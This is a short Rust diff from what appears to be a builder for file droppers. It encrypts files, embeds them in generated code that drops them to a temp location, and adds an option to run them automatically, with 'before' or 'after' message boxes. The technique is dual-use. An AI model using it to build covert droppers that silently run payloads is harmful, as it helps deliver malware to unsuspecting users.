@@ -39,7 +39,7 @@ fn generate_random_key() -> Vec<u8> {
   Aes256Gcm::generate_key(rand::thread_rng()).to_vec()
 }
 
-fn read_n_encrypt_file(str_path: &str, key: &Vec<u8>) -> Option<String> {
+fn read_n_encrypt_file(str_path: &str, key: &Vec<u8>, autorun: bool) -> Option<String> {
 
   let path = PathBuf::from(str_path);
   let filename = path.file_name().unwrap().to_str().unwrap();
@@ -69,7 +69,7 @@ fn read_n_encrypt_file(str_path: &str, key: &Vec<u8>) -> Option<String> {
   let nonce_b64 = general_purpose::STANDARD_NO_PAD.encode(nonce);
   let enc_data_b64 = general_purpose::STANDARD_NO_PAD.encode(enc_data);
 
-  Some("decrypt_n_drop(\"".to_owned()+filename+"\", b\""+&nonce_b64+"\", b\""+&enc_data_b64+"\", key);")
+  Some("decrypt_n_drop(&temp, \"".to_owned()+filename+"\", b\""+&nonce_b64+"\", b\""+&enc_data_b64+"\", key, " + if autorun { "true" } else { "false" } + ");")
 }
 
 fn zip(data: Vec<u8>) -> Option<Vec<u8>> {
@@ -106,7 +106,7 @@ fn main() {
 
   // Check if console for windows is enabled
   #[allow(unused_assignments)]
-  if cfg!(feature="show_messagebox") {
+  if cfg!(any(feature="show_messagebox_after", feature="show_messagebox_before")) {
     generated_code = generated_code.replace("--messagebox-title--", "--msgbox-title-build--")
                                    .replace("--messagebox-text--", "--msgbox-text-build--")
                                    .replace("SHOW_MESSAGEBOX_TYPE", "--msgbox-type-build--");
